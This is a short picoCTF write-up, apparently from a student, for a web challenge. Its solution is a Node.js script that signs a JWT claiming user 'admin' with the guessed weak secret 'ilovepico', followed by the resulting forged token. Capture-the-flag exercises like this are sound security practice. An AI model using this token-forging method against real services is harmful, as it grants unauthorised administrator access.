#### Descripción 
Check the admin scratchpad!http://fickle-tempest.picoctf.net:61373
#### Solución
```
SebAcuna-picoctf@webshell:~$ npm install jsonwebtoken

added 15 packages in 6s

1 package is looking for funding
  run `npm fund` for details
npm notice
npm notice New major version of npm available! 10.9.2 -> 11.11.0
npm notice Changelog: https://github.com/npm/cli/releases/tag/v11.11.0
npm notice To update run: npm install -g npm@11.11.0
npm notice
SebAcuna-picoctf@webshell:~$ nano jwt.js
SebAcuna-picoctf@webshell:~$ node jwt.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3NzI1Nzk3MTl9.Ixdss0quQKwp76uJRg0jY-RG--OKIdU-gU5uB7OGbko

Contenido de jwt.js:
const jwt = require('jsonwebtoken');

const secret = "ilovepico";
const payload = { user: "admin" }; // aquí cambias el contenido

const token = jwt.sign(payload, secret, { algorithm: "HS256" });

console.log(token);
```
#### Notas
#### Referencias

